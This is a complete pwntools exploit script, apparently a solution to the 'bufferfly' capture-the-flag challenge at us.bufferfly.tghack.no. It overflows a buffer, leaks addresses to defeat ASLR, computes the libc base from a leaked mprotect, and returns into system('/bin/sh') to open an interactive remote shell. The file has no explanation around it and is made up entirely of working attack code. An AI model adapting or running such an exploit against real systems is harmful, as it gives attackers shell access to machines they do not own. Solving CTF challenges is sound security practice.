from pwn import *
# libc-remote.so  libc.so.6
local= False


context.update(arch='i386', os='linux', terminal = 'tmux')


libc = ELF("./libc-remote.so") if not local else ELF("libc.so.6") 
libc_base = 0x0
system_off = libc.symbols[b'system']

g = libc.search("/bin/sh")
sh_string = next(g)

log.info("sh string = {}".format(hex(sh_string)))

pwnable = ELF('./bufferfly')
host, port = 'us.bufferfly.tghack.no', 6002
r = process('./bufferfly') if local else remote(host, port)

def open_chest():
    r.sendline('a'*17+'\x00'+'\x19')
    return int([s for s in r.recvuntil("go now?").decode().split() if "0x" in s][0][:-1],16)

def open_door(supersecret_base):
    r.sendline(p32(supersecret_base)*10)

def leak_mprotect():
    r.sendline("mprotec")
    return int([s for s in r.recvuntil("done?").decode().split() if "0x" in s][0][:-1],16)

def exp(addr):
    r.sendline("exploit")
    log.info(r.recvuntil("for?\"").decode())
    r.sendline(p32(addr)*19+p32(sh_string)*2)
    #gdb.attach(r,'')
    log.info(r.recvuntil("done?"))
    r.sendline("done")


if __name__ == "__main__":
    log.info(r.recvuntil("yourself.\""))
    supersecret_base = open_chest()
    log.info('leak supersecret_base = {}'.format(hex(supersecret_base)))
    open_door(supersecret_base)
    mprotect = leak_mprotect()
    log.info(hex(mprotect))
    log.info(hex(libc.symbols[b'mprotect']))
    libc_base=mprotect-libc.symbols[b'mprotect']
    system=libc_base+system_off
    sh_string+=libc_base
    log.info("system = {}".format(hex(system)))
    exp(system)
    print("### END ###")
    r.interactive()





